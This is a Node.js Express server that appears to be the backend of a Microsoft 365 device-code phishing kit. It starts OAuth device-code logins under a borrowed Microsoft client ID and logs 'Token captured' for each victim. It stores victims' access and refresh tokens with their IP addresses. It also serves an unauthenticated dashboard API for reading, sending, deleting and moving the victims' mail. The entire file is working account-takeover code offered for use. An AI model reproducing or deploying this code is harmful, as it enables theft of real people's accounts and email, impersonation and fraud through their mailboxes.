const express = require('express');
const axios = require('axios');
const cors = require('cors');
const crypto = require('crypto');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// Microsoft Device Code Configuration
const MICROSOFT_CONFIG = {
    clientId: 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
    deviceCodeUrl: 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
    tokenUrl: 'https://login.microsoftonline.com/common/oauth2/v2.0/token',
    scopes: 'https://graph.microsoft.com/Mail.ReadWrite https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/MailboxSettings.ReadWrite https://graph.microsoft.com/User.Read offline_access'
};

let userSessions = new Map();
let pendingDeviceCodes = new Map();

function getClientIp(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
}

// Start device authentication
app.post('/api/device/auth/start', async (req, res) => {
    try {
        const clientIp = getClientIp(req);
        const userAgent = req.headers['user-agent'] || 'Unknown';
        
        const response = await axios.post(MICROSOFT_CONFIG.deviceCodeUrl,
            new URLSearchParams({
                client_id: MICROSOFT_CONFIG.clientId,
                scope: MICROSOFT_CONFIG.scopes
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code, verification_uri, expires_in } = response.data;
        const sessionId = crypto.randomBytes(32).toString('hex');
        
        pendingDeviceCodes.set(device_code, {
            device_code, user_code, sessionId, status: 'pending',
            ip: clientIp, userAgent: userAgent,
            createdAt: Date.now(),
            expiresAt: Date.now() + (expires_in * 1000)
        });
        
        startPollingForToken(device_code, sessionId);
        
        res.json({ sessionId, user_code, verification_uri, expires_in });
        
    } catch (err) {
        console.error('Device code error:', err.message);
        res.status(500).json({ error: 'Failed to start device authentication' });
    }
});

async function startPollingForToken(device_code, sessionId) {
    const pollInterval = setInterval(async () => {
        const pendingDevice = pendingDeviceCodes.get(device_code);
        if (!pendingDevice || pendingDevice.status !== 'pending') {
            clearInterval(pollInterval);
            return;
        }
        
        if (Date.now() > pendingDevice.expiresAt) {
            pendingDevice.status = 'expired';
            pendingDeviceCodes.delete(device_code);
            clearInterval(pollInterval);
            return;
        }
        
        try {
            const response = await axios.post(MICROSOFT_CONFIG.tokenUrl,
                new URLSearchParams({
                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
                    client_id: MICROSOFT_CONFIG.clientId,
                    device_code: device_code
                }), {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                }
            );
            
            const tokens = response.data;
            
            const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                headers: { 'Authorization': `Bearer ${tokens.access_token}` }
            });
            
            const session = {
                sessionId,
                email: userInfo.data.mail || userInfo.data.userPrincipalName,
                displayName: userInfo.data.displayName,
                userId: userInfo.data.id,
                ip: pendingDevice.ip,
                userAgent: pendingDevice.userAgent,
                tokens: {
                    access_token: tokens.access_token,
                    refresh_token: tokens.refresh_token,
                    expires_in: tokens.expires_in,
                    expires_at: Date.now() + (tokens.expires_in * 1000)
                },
                createdAt: new Date().toISOString(),
                lastActive: new Date().toISOString()
            };
            
            userSessions.set(sessionId, session);
            pendingDevice.status = 'approved';
            pendingDeviceCodes.delete(device_code);
            clearInterval(pollInterval);
            
            console.log(`✅ Token captured for ${session.email}`);
            
        } catch (err) {
            if (err.response?.data?.error !== 'authorization_pending') {
                console.log('Waiting for user approval...');
            }
        }
    }, 3000);
}

async function getValidToken(session) {
    if (Date.now() >= session.tokens.expires_at - 300000) {
        try {
            const response = await axios.post(MICROSOFT_CONFIG.tokenUrl,
                new URLSearchParams({
                    grant_type: 'refresh_token',
                    refresh_token: session.tokens.refresh_token,
                    client_id: MICROSOFT_CONFIG.clientId
                }), {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                }
            );
            
            session.tokens.access_token = response.data.access_token;
            session.tokens.refresh_token = response.data.refresh_token || session.tokens.refresh_token;
            session.tokens.expires_in = response.data.expires_in;
            session.tokens.expires_at = Date.now() + (response.data.expires_in * 1000);
            session.lastActive = new Date().toISOString();
            
            return session.tokens.access_token;
        } catch (err) {
            return null;
        }
    }
    return session.tokens.access_token;
}

// API Endpoints
app.get('/api/device/status/:sessionId', async (req, res) => {
    const { sessionId } = req.params;
    
    const session = userSessions.get(sessionId);
    if (session) {
        return res.json({ status: 'approved', email: session.email });
    }
    
    for (const pending of pendingDeviceCodes.values()) {
        if (pending.sessionId === sessionId) {
            return res.json({ status: pending.status });
        }
    }
    
    res.json({ status: 'not_found' });
});

app.get('/api/sessions', async (req, res) => {
    const sessions = Array.from(userSessions.values()).map(s => ({
        sessionId: s.sessionId,
        email: s.email,
        displayName: s.displayName,
        ip: s.ip,
        userAgent: s.userAgent,
        lastActive: s.lastActive,
        createdAt: s.createdAt
    }));
    res.json({ sessions });
});

// Get all mail folders
app.get('/api/mail/folders/:sessionId', async (req, res) => {
    const { sessionId } = req.params;
    const session = userSessions.get(sessionId);
    
    if (!session) return res.status(401).json({ error: 'Session not found' });
    
    const token = await getValidToken(session);
    if (!token) return res.status(401).json({ error: 'Token expired' });
    
    try {
        const response = await axios.get('https://graph.microsoft.com/v1.0/me/mailFolders', {
            headers: { 'Authorization': `Bearer ${token}` },
            params: { '$top': 100 }
        });
        
        res.json(response.data);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch folders' });
    }
});

// Get emails from specific folder
app.get('/api/mail/:sessionId/:folderId', async (req, res) => {
    const { sessionId, folderId } = req.params;
    const { top = 50 } = req.query;
    
    const session = userSessions.get(sessionId);
    if (!session) return res.status(401).json({ error: 'Session not found' });
    
    const token = await getValidToken(session);
    if (!token) return res.status(401).json({ error: 'Token expired' });
    
    try {
        let folderPath = folderId;
        const folderMap = {
            'inbox': 'inbox',
            'sent': 'sentitems',
            'drafts': 'drafts',
            'deleted': 'deleteditems',
            'archive': 'archive',
            'junk': 'junkemail'
        };
        
        folderPath = folderMap[folderId] || folderId;
        
        const response = await axios.get(`https://graph.microsoft.com/v1.0/me/mailFolders/${folderPath}/messages`, {
            headers: { 'Authorization': `Bearer ${token}` },
            params: {
                '$top': top,
                '$orderby': 'receivedDateTime desc',
                '$select': 'id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments,importance,conversationId'
            }
        });
        
        res.json(response.data);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch emails' });
    }
});

// Get single email with full body
app.get('/api/mail/message/:sessionId/:messageId', async (req, res) => {
    const { sessionId, messageId } = req.params;
    
    const session = userSessions.get(sessionId);
    if (!session) return res.status(401).json({ error: 'Session not found' });
    
    const token = await getValidToken(session);
    if (!token) return res.status(401).json({ error: 'Token expired' });
    
    try {
        const response = await axios.get(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
            headers: { 'Authorization': `Bearer ${token}` },
            params: { '$select': 'id,subject,from,toRecipients,receivedDateTime,isRead,body,bodyPreview,hasAttachments,importance,conversationId' }
        });
        
        res.json(response.data);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch message' });
    }
});

// Send email
app.post('/api/mail/send/:sessionId', async (req, res) => {
    const { sessionId } = req.params;
    const { to, subject, body, cc } = req.body;
    
    const session = userSessions.get(sessionId);
    if (!session) return res.status(401).json({ error: 'Session not found' });
    
    const token = await getValidToken(session);
    if (!token) return res.status(401).json({ error: 'Token expired' });
    
    try {
        const emailData = {
            message: {
                subject: subject,
                body: { contentType: 'HTML', content: body },
                toRecipients: to.map(email => ({ emailAddress: { address: email } }))
            },
            saveToSentItems: true
        };
        
        if (cc && cc.length) {
            emailData.message.ccRecipients = cc.map(email => ({ emailAddress: { address: email } }));
        }
        
        await axios.post('https://graph.microsoft.com/v1.0/me/sendMail', emailData, {
            headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' }
        });
        
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to send email' });
    }
});

// Delete email
app.delete('/api/mail/message/:sessionId/:messageId', async (req, res) => {
    const { sessionId, messageId } = req.params;
    
    const session = userSessions.get(sessionId);
    if (!session) return res.status(401).json({ error: 'Session not found' });
    
    const token = await getValidToken(session);
    if (!token) return res.status(401).json({ error: 'Token expired' });
    
    try {
        await axios.delete(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
            headers: { 'Authorization': `Bearer ${token}` }
        });
        
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to delete message' });
    }
});

// Mark as read/unread
app.patch('/api/mail/message/:sessionId/:messageId', async (req, res) => {
    const { sessionId, messageId } = req.params;
    const { isRead } = req.body;
    
    const session = userSessions.get(sessionId);
    if (!session) return res.status(401).json({ error: 'Session not found' });
    
    const token = await getValidToken(session);
    if (!token) return res.status(401).json({ error: 'Token expired' });
    
    try {
        await axios.patch(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, 
            { isRead: isRead },
            { headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' } }
        );
        
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to update message' });
    }
});

// Move email to folder
app.post('/api/mail/move/:sessionId/:messageId', async (req, res) => {
    const { sessionId, messageId } = req.params;
    const { destinationId } = req.body;
    
    const session = userSessions.get(sessionId);
    if (!session) return res.status(401).json({ error: 'Session not found' });
    
    const token = await getValidToken(session);
    if (!token) return res.status(401).json({ error: 'Token expired' });
    
    try {
        const response = await axios.post(`https://graph.microsoft.com/v1.0/me/messages/${messageId}/move`,
            { destinationId: destinationId },
            { headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' } }
        );
        
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to move message' });
    }
});

app.delete('/api/sessions/clear', async (req, res) => {
    userSessions.clear();
    res.json({ success: true });
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Dashboard running on port ${PORT}`);
});
